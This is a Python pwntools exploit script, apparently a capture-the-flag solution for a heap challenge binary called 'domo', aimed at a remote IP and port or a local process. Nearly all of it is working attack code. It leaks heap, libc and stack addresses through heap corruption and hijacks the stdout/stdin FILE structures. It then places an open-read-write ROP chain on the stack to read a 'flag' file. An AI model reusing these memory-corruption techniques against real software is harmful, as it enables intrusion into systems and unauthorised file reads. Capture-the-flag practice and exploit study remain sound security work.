# -*- coding: utf-8 -*
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
elf = ELF('domo')
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = 0
def pwn(ip,port,debug):
	global p
	if(debug == 1):
		p = process('./domo')

	else:
		p = remote(ip,port)
	def add(size,content):
		p.sendlineafter("> ","1")
		p.sendlineafter("size:\n",str(size))
		p.sendafter("content:\n",content)
	def free(index):
		p.sendlineafter("> ","2")
		p.sendlineafter("index:\n",str(index))
	def show(index):
		p.sendlineafter("> ","3")
		p.sendlineafter("index:\n",str(index))
	def edit(index,content):
		p.sendlineafter("> ","4")
		p.sendlineafter("addr:",str(index))
		p.sendafter("num:",content)
	def add2(size,content):
		p.sendlineafter("> ","1")
		p.sendlineafter("size:",str(size))
		p.sendafter("content:",content)
	def free2(index):
		p.sendlineafter("> ","2")
		p.sendlineafter("index:",str(index))
	#-----link heap_addr
	add(0x18,"A")
	add(0x18,"A")
	free(0)
	free(1)
	add(0x18,"\x10")
	show(0)
	heap_addr=u64(p.recv(6).ljust(8,"\x00"))
	free(0)
	#--------link libc
	add(0x100,"A"*0x100)
	add(0x100,'b'*0x100)
	add(0x68,'c'*0x68)  
	add(0x68,'d'*0x68)  
	add(0x100,'e'*56+p64(0x71)+'e'*176+ p64(0x100) + p64(0x21))
	add(0x68,p64(0x21)*2) 
	free(2)
	free(3)
	free(0)
	add(0x68,"\x11"*0x60+p64(0x300))
	free(4)
	add(0x100,'flag'.ljust(8,'\x00')+'\x22'*0x58)
	show(1)
	main_arena=u64(p.recv(6).ljust(8,"\x00"))
	libcbase_addr=main_arena-0x3c4b78
	environ_addr=libcbase_addr+libc.symbols["environ"]
	stdout_hook=libcbase_addr+libc.symbols["_IO_2_1_stdout_"]
	stdin_hook=libcbase_addr+libc.symbols["_IO_2_1_stdin_"]
	_IO_file_jumps=libcbase_addr+libc.symbols["_IO_file_jumps"]
	#------link stack_addr
	payload="A"*0x100
	payload += p64(0) + p64(0x71)  
	payload+=p64(stdout_hook-0x43)
	add(0x118,payload)
	add(0x68,'a')
	payload=p64(0)*5+'\x00'*3+p64(_IO_file_jumps)+p64(0xfbad1800)+p64(stdout_hook+131)+p64(stdout_hook+131)+p64(stdout_hook+131)
	payload+=p64(environ_addr)+p64(environ_addr+8)
	print "len=",hex(len(payload))
	add(0x68,payload)
	stack_addr=u64(p.recv(6).ljust(8,'\x00'))-0xf2
	#--------Write orw to stack 
	add2(0xf8,p64(0)*11+p64(0x71))
	free2(0)
	free2(4)
	add2(0x68,p64(0)+p64(0x111))
	free2(7)
	add2(0x108,p64(0)*11+p64(0x71)+p64(stdin_hook-0x28))
	add2(0x68,'flag')
	pop_rdi_ret=libcbase_addr+libc.search(asm("pop rdi\nret")).next()
	pop_rsi_ret=libcbase_addr+libc.search(asm("pop rsi\nret")).next()
	pop_rdx_ret=libcbase_addr+libc.search(asm("pop rdx\nret")).next()
	open_addr=libcbase_addr+libc.symbols["open"]
	read_addr=libcbase_addr+libc.symbols["read"]
	puts_addr=libcbase_addr+libc.symbols["write"]
	orw=p64(pop_rdi_ret)+p64(heap_addr+0x50)+p64(pop_rsi_ret)+p64(72)+p64(open_addr)
	orw+=p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_ret)+p64(heap_addr+0x12a8)+p64(pop_rdx_ret)+p64(0x30)+p64(read_addr)
	orw+=p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_ret)+p64(heap_addr+0x12a8)+p64(pop_rdx_ret)+p64(0x100)+p64(puts_addr)
	payload=p64(0)+p64(libcbase_addr+libc.symbols["_IO_wfile_jumps"])+p64(0)+p64(0xfbad1800)+p64(0)*6+p64(stack_addr)+p64(stack_addr+0x100)
	print "heap_addr=",hex(heap_addr)
	print "len=",hex(len(payload))
	print "stack_addr=",hex(stack_addr)
	edit(stdin_hook-0x20,'\x7f')
	add2(0x68,payload)
	p.sendlineafter("> ","5\n"+orw)
	p.interactive()
if __name__ == '__main__':
	pwn('39.105.231.146',10016,1)
